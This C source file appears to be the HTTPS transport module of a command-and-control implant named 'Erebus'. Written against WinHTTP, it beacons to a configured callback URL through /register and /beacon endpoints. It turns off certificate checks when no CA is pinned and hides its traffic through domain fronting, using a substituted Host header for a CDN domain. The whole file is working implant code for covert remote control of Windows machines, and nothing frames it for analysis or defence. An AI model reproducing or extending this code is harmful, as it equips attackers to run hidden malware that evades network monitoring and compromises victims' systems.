#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/config.h"
#include "erebus/transport.h"

#pragma comment(lib, "winhttp.lib")

typedef struct https_ctx {
    wchar_t host[256];
    wchar_t path_register[64];
    wchar_t path_beacon[64];
    INTERNET_PORT port;
    int use_tls;
    wchar_t cdn_host[256];
} https_ctx;

static int https_post(https_ctx *ctx, const wchar_t *path, const uint8_t *body, size_t body_len, uint8_t **resp, size_t *resp_len) {
    HINTERNET session = WinHttpOpen(L"Erebus/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) return 0;

    HINTERNET connect = WinHttpConnect(session, ctx->host, ctx->port, 0);
    if (!connect) { WinHttpCloseHandle(session); return 0; }

    DWORD flags = ctx->use_tls ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return 0; }

    if (ctx->use_tls && EREBUS_CA_CERT_PEM[0] == '\0') {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    if (ctx->cdn_host[0]) {
        WinHttpAddRequestHeaders(request, ctx->cdn_host, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    }

    const wchar_t *ctype = L"Content-Type: application/octet-stream\r\n";
    WinHttpAddRequestHeaders(request, ctype, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL ok = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0);
    if (!ok) goto cleanup;
    ok = WinHttpReceiveResponse(request, NULL);
    if (!ok) goto cleanup;

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) goto cleanup;

    uint8_t chunk[8192];
    DWORD read = 0;
    *resp = NULL;
    *resp_len = 0;
    size_t total = 0;
    while (WinHttpReadData(request, chunk, sizeof(chunk), &read) && read > 0) {
        uint8_t *n = (uint8_t *)realloc(*resp, total + read);
        if (!n) { free(*resp); *resp = NULL; goto cleanup; }
        *resp = n;
        memcpy(*resp + total, chunk, read);
        total += read;
        if (total > (1 << 20)) break;
    }
    *resp_len = total;
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return 1;

cleanup:
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    free(*resp);
    *resp = NULL;
    *resp_len = 0;
    return 0;
}

static void parse_url(const char *url, https_ctx *ctx) {
    ctx->port = 443;
    ctx->use_tls = 1;
    wcscpy(ctx->path_register, L"/register");
    wcscpy(ctx->path_beacon, L"/beacon");

    const char *p = url;
    if (strncmp(p, "https://", 8) == 0) p += 8;
    else if (strncmp(p, "http://", 7) == 0) { p += 7; ctx->use_tls = 0; ctx->port = 80; }

    char host[256] = {0};
    const char *slash = strchr(p, '/');
    size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
    if (hlen >= sizeof(host)) hlen = sizeof(host) - 1;
    memcpy(host, p, hlen);
    char *colon = strchr(host, ':');
    if (colon) {
        *colon = '\0';
        ctx->port = (INTERNET_PORT)atoi(colon + 1);
    }
    MultiByteToWideChar(CP_UTF8, 0, host, -1, ctx->host, 256);

    if (EREBUS_CDN_DOMAIN[0]) {
        wchar_t hdr[300];
        swprintf(hdr, 300, L"Host: %S\r\n", EREBUS_CDN_DOMAIN);
        wcsncpy(ctx->cdn_host, hdr, 255);
    }
}

static int https_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    https_ctx *ctx = (https_ctx *)t->ctx;
    return https_post(ctx, ctx->path_register, req, req_len, resp, resp_len);
}

static int https_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    https_ctx *ctx = (https_ctx *)t->ctx;
    return https_post(ctx, ctx->path_beacon, req, req_len, resp, resp_len);
}

static void https_destroy(erebus_transport *t) {
    free(t->ctx);
    free(t);
}

static const erebus_transport_ops https_ops = {
    https_register,
    https_beacon,
    https_destroy,
};

int erebus_transport_create_https(erebus_transport **out) {
    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
    https_ctx *ctx = (https_ctx *)calloc(1, sizeof(*ctx));
    if (!t || !ctx) { free(t); free(ctx); return 0; }
    parse_url(EREBUS_CALLBACK_URL, ctx);
    t->ops = &https_ops;
    t->ctx = ctx;
    *out = t;
    return 1;
}